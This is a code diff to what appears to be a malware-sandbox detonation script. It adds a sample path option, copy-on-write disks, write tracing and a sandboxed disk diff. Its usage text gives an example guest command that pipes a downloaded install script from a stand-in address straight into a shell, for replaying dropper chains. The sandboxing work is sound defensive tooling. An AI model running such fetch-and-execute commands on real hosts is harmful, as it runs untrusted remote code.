@@ -5,10 +5,11 @@
                  [--duration 300] [--cmd 'shell command run in the guest']
 
 --sample is a path under /srv/sandbox/serve. The guest downloads it from the
-sink (http://10.200.0.1/_sbx/<sample>) to /tmp/.b, makes it executable and
-runs it with --args. --cmd replaces that with any guest shell command, e.g.
-"wget -qO- http://198.51.100.7/install.sh | sh" to replay a dropper chain
-against rules.json.
+sink (http://10.200.0.1/_sbx/<sample>) to /tmp/.b (--name: another path,
+for samples that check their own name or directory), makes it executable,
+changes to its directory and runs it with --args. --cmd replaces that with
+any guest shell command, e.g. "wget -qO- http://198.51.100.7/install.sh | sh"
+to replay a dropper chain against rules.json.
 
 Per run, in /srv/sandbox/runs/<run-id>/:
   console.log    full serial console transcript (boot, sample stdout, SBXMON)
@@ -16,11 +17,17 @@ Per run, in /srv/sandbox/runs/<run-id>/:
   sink.jsonl     sink events (DNS queries, TCP/HTTP/TLS sessions, UDP
                  summaries) from this guest's address during the run
   dhcp.log       dnsmasq DHCP lines for this guest
+  trace.jsonl    syscall events (targets with a tracer; see sbx-trace.py)
+  fsdiff.json    what changed on the guest's disk (sbx-fsdiff.py), and
+  fs-changed.tar.gz  the added/modified files themselves
   run.json       parameters, guest MAC/IP, timings, sample SHA-256
 
 Isolation: the guest's tap is an isolated port on sbx0 (sink-only). QEMU runs
-as user sbx in a transient systemd unit with /etc/sbx/inaccessible hidden,
-memory and runtime limits, and the rootfs attached with snapshot=on.
+as user sbx in a transient systemd unit with /etc/sbx/inaccessible hidden and
+memory and runtime limits. The rootfs is attached through a per-run qcow2
+overlay in the run's scratch directory; the clean image is never written.
+The guest's /tmp and /var are tmpfs, so files written there are not on the
+disk: --trace-write (traced targets) shows those writes.
 """
 import argparse
 import hashlib
@@ -193,6 +200,16 @@ def main():
                     help="do not attach the out-of-guest syscall tracer (sbx-trace.py)")
     ap.add_argument("--trace-open", action="store_true",
                     help="also trace open/openat (very noisy; slows the guest)")
+    ap.add_argument("--trace-write", action="store_true",
+                    help="also trace file writes, chmod, mkdir, links and renames, "
+                         "with the first bytes of each write")
+    ap.add_argument("--name", default="/tmp/.b",
+                    help="guest path the sample is saved as and run from (default /tmp/.b)")
+    ap.add_argument("--no-fsdiff", action="store_true",
+                    help="do not diff the guest disk against the clean image")
+    ap.add_argument("--fs-baseline", action="store_true",
+                    help="save this run's disk changes as the target's first-boot "
+                         "baseline (use with --cmd true)")
     ap.add_argument("--memdump", default="end",
                     help="when to dump guest memory: comma-separated seconds after "
                          "detonation and/or 'end' (default: end); 'none' to disable")
@@ -202,6 +219,10 @@ def main():
         sys.exit("run as root (needs tap + capture)")
     if not a.sample and not a.cmd:
         sys.exit("need --sample or --cmd")
+    if not re.fullmatch(r"(/[A-Za-z0-9._-]+)+", a.name) or "/../" in a.name + "/":
+        sys.exit("--name must be an absolute guest path of [A-Za-z0-9._-] components")
+    if a.fs_baseline and (a.sample or a.no_fsdiff):
+        sys.exit("--fs-baseline is for a run without a sample (--cmd true)")
     if sh("systemctl", "is-active", "--quiet", "sbx-sink.service", check=False).returncode:
         sys.exit("sbx-sink.service is not running")
 
@@ -232,6 +253,7 @@ def main():
     unit = f"sbx-vm-{n:x}"
     meta = {"run_id": run_id, "target": a.target, "sample": a.sample,
             "sample_sha256": sample_sha, "args": a.args, "cmd": a.cmd,
+            "name": None if a.cmd else a.name,
             "duration": a.duration, "mac": mac, "tap": tap, "unit": unit,
             "image": json.load(open(f"{img}/manifest.json"))}
 
@@ -251,7 +273,12 @@ def main():
                                stderr=open(f"{rdir}/tcpdump.log", "w"))
         meta["start"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
 
-        subst = {"kernel": f"{img}/kernel", "rootfs": f"{img}/rootfs.ext4",
+        # per-run copy-on-write disk over the clean image
+        disk = f"{rtmp}/disk.qcow2"
+        sh("qemu-img", "create", "-q", "-f", "qcow2", "-F", "raw",
+           "-b", f"{img}/rootfs.ext4", disk)
+        sh("chown", "sbx:sbx", disk)
+        subst = {"kernel": f"{img}/kernel", "rootfs": f"{img}/rootfs.ext4", "disk": disk,
                  "tap": tap, "mac": mac, "mem": a.mem}
         argv = [x.format(**subst) for x in t["qemu"]]
         argv += ["-display", "none", "-no-reboot",
@@ -285,7 +312,10 @@ def main():
                 break
             if time.time() > deadline:
                 raise SystemExit("no shell prompt on the console")
-        con.run("dmesg -n 1")
+        # quiet console; write dirty pages back within ~1-2 s (default 30 s)
+        # so the disk diff sees files written shortly before the run ends
+        con.run("dmesg -n 1; echo 100 >/proc/sys/vm/dirty_expire_centisecs; "
+                "echo 100 >/proc/sys/vm/dirty_writeback_centisecs")
         ip = lease_ip(mac, 120)
         meta["guest_ip"] = ip
         if not ip:
@@ -293,15 +323,17 @@ def main():
         meta["boot_done"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
 
         if trace:
-            gdbp = start_tracer(con, t, img, rtmp, gdb_port, a.trace_open, meta)
+            gdbp = start_tracer(con, t, img, rtmp, gdb_port, a.trace_open, a.trace_write, meta)
 
         if not a.no_monitor:
             con.run("/usr/libexec/sbx/sh /usr/libexec/sbx/mon.sh </dev/null >/dev/console 2>&1 &")
         if a.cmd:
             con.send(a.cmd)
         else:
-            con.run(f"cd /tmp && wget -q -O .b http://10.200.0.1/_sbx/{a.sample} && chmod 777 .b", 60)
-            con.send(f"./.b {a.args}".rstrip())
+            d, base = os.path.split(a.name)
+            con.run(f"mkdir -p {d} && cd {d} && "
+                    f"wget -q -O {base} http://10.200.0.1/_sbx/{a.sample} && chmod 777 {base}", 60)
+            con.send(f"./{base} {a.args}".rstrip())
         meta["detonated"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
         t0 = time.time()
         end = t0 + a.duration
@@ -323,7 +355,7 @@ def main():
             # are computed by the shell, so the echoed command line cannot
             # match them. The sample may have killed the console shell: no
             # marker is recorded, not an error.
-            con.send("read p </var/run/sbxmon.pid; kill $p; "
+            con.send("read p </var/run/sbxmon.pid; kill $p; sync; "
                      "echo SBXPOST-$((1))BEGIN; " + a.post + "; echo SBXPOST-$((1))END")
             meta["post_ran"] = con.wait(rb"SBXPOST-1END\r?\n", 90)
     finally:
@@ -346,6 +378,8 @@ def main():
                 sh("gzip", "-1", f"{rtmp}/{d['file']}", check=False)
                 sh("mv", f"{rtmp}/{d['file']}.gz", rdir, check=False)
                 d["file"] += ".gz"
+        if not a.no_fsdiff and os.path.exists(f"{rtmp}/disk.qcow2"):
+            meta["fsdiff"] = fsdiff(rtmp, rdir, img, a.fs_baseline)
         collect(meta, rdir)
         with open(f"{rdir}/run.json", "w") as f:
             json.dump(meta, f, indent=1)
@@ -353,7 +387,44 @@ def main():
         print(rdir)
 
 
-def start_tracer(con, t, img, rtmp, port, trace_open, meta):
+def fsdiff(rtmp, rdir, img, save_baseline):
+    """Diff the run's disk against the clean image (QEMU has exited).
+
+    The disk is guest-written, so sbx-fsdiff.py runs as sbx in a transient
+    unit with no network and only its output directory writable."""
+    out = f"{rtmp}/fsdiff"
+    os.makedirs(out)
+    sh("chown", "sbx:sbx", out)
+    base = f"{img}/fs-baseline.json"
+    props = ["User=sbx", "Group=sbx", "NoNewPrivileges=yes", "PrivateNetwork=yes",
+             "ProtectSystem=strict", "ProtectHome=yes", "PrivateTmp=yes",
+             f"ReadWritePaths={out}", f"ReadOnlyPaths={img} {rtmp}/disk.qcow2",
+             "InaccessiblePaths=" + " ".join("-" + p for p in inaccessible()),
+             "RuntimeMaxSec=600", "MemoryMax=1G", "TasksMax=16"]
+    r = sh("systemd-run", "--quiet", "--collect", "--wait", "--pipe",
+           *[f"--property={p}" for p in props],
+           "python3", "-I", f"{SBX}/run/sbx-fsdiff.py",
+           f"{img}/rootfs.ext4", f"{rtmp}/disk.qcow2", out, base,
+           check=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    try:
+        res = json.load(open(f"{out}/fsdiff.json"))
+    except (OSError, ValueError):
+        return {"error": f"sbx-fsdiff failed (rc {r.returncode}): {r.stdout[-500:]}"}
+    for fn in ("fsdiff.json", "fs-changed.tar.gz"):
+        if os.path.exists(f"{out}/{fn}"):
+            sh("cp", f"{out}/{fn}", rdir)
+    if save_baseline and "paths" in res:
+        with open(base, "w") as f:
+            json.dump({"run": os.path.basename(rdir), "paths": res["paths"]}, f, indent=1)
+    summary = {k: len(res.get(k, [])) for k in ("added", "deleted", "modified", "renamed")}
+    summary["not_boot"] = sum(1 for k in ("added", "deleted", "modified", "renamed")
+                              for e in res.get(k, []) if not e.get("boot"))
+    if "error" in res:
+        summary["error"] = res["error"]
+    return summary
+
+
+def start_tracer(con, t, img, rtmp, port, trace_open, trace_write, meta):
     """Attach sbx-trace.py through QEMU's gdb stub and calibrate it.
 
     The console shell's PID is the calibration anchor: the tracer waits for
@@ -366,7 +437,7 @@ def start_tracer(con, t, img, rtmp, port, trace_open, meta):
     shell_pid = int(re.search(rb"SBXPID=(\d+)\r?\n", con.buf).group(1))
     con.wait(PROMPT, 10)
     cfg = {"port": port, "kernel": f"{img}/kernel", "endian": t.get("endian", "little"),
-           "shell_pid": shell_pid, "trace_open": trace_open,
+           "shell_pid": shell_pid, "trace_open": trace_open, "trace_write": trace_write,
            "out": f"{rtmp}/trace.jsonl", "status": f"{rtmp}/trace.status"}
     with open(f"{rtmp}/trace.json", "w") as f:
         json.dump(cfg, f)
